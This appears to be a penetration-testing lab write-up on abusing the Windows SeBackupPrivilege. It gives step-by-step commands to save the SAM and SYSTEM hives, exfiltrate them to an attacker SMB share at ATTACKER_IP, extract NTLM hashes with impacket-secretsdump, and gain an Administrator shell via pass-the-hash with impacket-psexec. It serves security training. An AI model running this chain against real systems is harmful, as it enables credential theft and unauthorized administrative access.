# SeBackupPrivilege — Dumping SAM & SYSTEM for Pass-the-HashSeBackup

- **SeBackup** : is a Windows privilege that allow a user to read any file on the system even if NTFS permissions deny access..

### Objective:

Exploit excessive Windows privileges to obtain a high-privileged shell.

### Vulnerability Overview :

- A low‑privileged user with privileges like SeBackup and SeRestore can access to sensitive data like SAM & SYSTEM which can be exploited to get the correct hashes of the password’s users
- **SAM :** database that stores users accounts + **encrypted** password hashes.
- **SYSTEM :** contains the secret key that can decrypt those hases .

so SAM + SYSTEM allow extraction of NTLM hashes, which enables Pass-the-Hash authentication.

**Windows accepts this authentication method.** 

### Required condition:

- have the SeBackup privilege.

### Enumeration / Discovery:

- We list our privileges using:   `whoami /priv` .

![image.png](SeBackupPrivilege%20%E2%80%94%20Dumping%20SAM%20&%20SYSTEM%20for%20Pass-/image.png)

**!!! - “Disabled” ≠ “not owned” :** The privilege exists in the user token but the current process has not activated it.    A program can still enable it if allowed.

### Exploitation Steps :

1. **Save a copy of the SYSTEM registry hive :**

      ** `**reg save hklm\system   C:\Temp\system.hive` 

1. **Save a copy of the SAM registry hive :**

       `reg save hklm\sam   C:\Temp\sam.hive`

1. **Start a local SMB file server :**
- An **SMB server** is a network service that provides shared access to files and printers using the SMB protocol, mainly in Windows environments.
- On the attacker machine we use that command :

`impacket-smbserver public share -smb2support -username USERNAME -password  PASSWORD`

— `impacket-smbserver` : Creates a fake / temporary SMB server

⇒ 
This command creates an authenticated SMB share on the attacker system to receive files from the target. The share name is **public**, backed by the local folder **share**, with SMB2 enabled to support modern Windows clients, allowing the attacker to collect sensitive files such as SAM and SYSTEM hives.

!!!  Do not forget to create the local folder named `share` before starting the SMB server.

1. **Copy the SYSTEM &SAM registry hive to the attacker machine :**
- on the vulnerable machine (windows) :

`copy  PATH_TO\sam.hive  \\ATTACKER_IP\public\` 

`copy  PATH_TO\system.hive  \\ATTACKER_IP\public\` 

![image.png](SeBackupPrivilege%20%E2%80%94%20Dumping%20SAM%20&%20SYSTEM%20for%20Pass-/image%201.png)

1. **Retrieve the decrypted hashes :**
- now we have both sam.hive and system.hive on our attacker machine (the encrypted hashes + the key):

`impacket-secretsdump -sam sam.hive -system system.hive LOCAL` 

⇒

This command decrypts and extracts password hashes from the offline Windows SAM database using the SYSTEM hive.

- `impacket‑secretsdump` is a tool from the Impacket suite that extracts credentials from Windows systems.

![image.png](SeBackupPrivilege%20%E2%80%94%20Dumping%20SAM%20&%20SYSTEM%20for%20Pass-/image%202.png)

1. **Connect with the hashes:**
- since we have the users usernames with there password’s hashes we can use the technic  Pass-The-Hash to get a shell with high privileges :

`impacket-psexec -hashes <LM:NTLM> Administrator@IP_OF_THE_MACHINE`

⇒ 

`impacket‑psexec` is a tool that gives you a remote command shell on a Windows machine using the SMB protocol.

and Here We Go :

![image.png](SeBackupPrivilege%20%E2%80%94%20Dumping%20SAM%20&%20SYSTEM%20for%20Pass-/image%203.png)

### Key Takeaways :

- While enumerating the target machine , pay attention to such privileges.
- Excessive Windows privileges lead to privilege escalation.
- The SAM and SYSTEM hives contain critical credential material.
- `impacket‑secretsdump` enables offline hash extraction.
- Pass‑the‑Hash allows authentication without cracking.
- SMB servers are useful for data exfiltration.
- Least‑privilege principle is critical.